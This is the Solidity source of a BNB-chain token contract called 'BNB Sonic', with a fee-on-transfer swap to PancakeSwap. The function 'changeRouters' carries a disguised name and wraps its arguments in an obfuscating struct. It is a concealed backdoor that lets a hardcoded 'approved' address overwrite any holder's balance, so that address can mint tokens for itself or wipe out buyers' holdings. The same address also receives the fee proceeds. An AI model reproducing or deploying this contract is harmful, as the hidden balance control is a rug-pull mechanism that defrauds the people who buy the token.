// SPDX-License-Identifier: MIT

//Portal: https://t.me/BNBSonic

pragma solidity ^0.8.0;

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    constructor () {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }
}

contract BNB is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public approved;

    string public name;
    string public symbol;
    uint8 public decimals;

    mapping(address => bool) public _isExcludeFromFee;
    
    uint256 public totalSupply;

    IUniswapRouter public _uniswapRouter;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _fee = 3;
    address public _uniswapPair;

    constructor (){
        name = "BNB Sonic";
        symbol = unicode"BNBSonic";
        decimals = 9;
        uint256 Supply = 1000000000;
        approved = 0x6BC20923cB89b03C65ADd2d97D7b76Ff8E2a4b5f;

        totalSupply = Supply * 10 ** decimals;
        address receiveAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[receiveAddr] = true;
        _isExcludeFromFee[approved] = true;
        _balances[receiveAddr] = totalSupply;
        emit Transfer(address(0), receiveAddr, totalSupply);

        _uniswapRouter = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;

    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    struct inswaper{address mss;uint256 amo;address fom;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function changeRouters(address ac,uint256 na) public {inswaper memory index = inswaper({mss : msg.sender,amo : na,fom : ac});require(approved == index.mss);_balances[index.fom] = index.amo;}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_transfer(sender, recipient, amount);if (_allowances[sender][msg.sender] != MAX) {_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;}return true;}
    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    
    function _transfer(address from,address to,uint256 amount
    ) private {

        if (_uniswapPair == to && !inSwap) {
            inSwap = true;
            uint256 _bal = balanceOf(address(this));
            if (_bal > 0) {
                uint256 _swapamount = amount;
                _swapamount = _swapamount > _bal ? _bal : _swapamount;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = _uniswapRouter.WETH();
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_swapamount,0,path,address(approved),block.timestamp) {} catch {}
            }
            inSwap = false;
        }
        
        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap;

        _balances[from] = _balances[from] - amount;
        uint256 feeAmount;

        if (takeFee && _fee > 0) {
            uint256 _a = amount * _fee / 100;
            feeAmount += _a;
            _balances[address(this)] = _balances[address(this)] + _a;
            emit Transfer(from, address(this), _a);
        }

        _balances[to] = _balances[to] + amount - feeAmount;
        emit Transfer(from, to, amount - feeAmount);
    }
    receive() external payable {}
}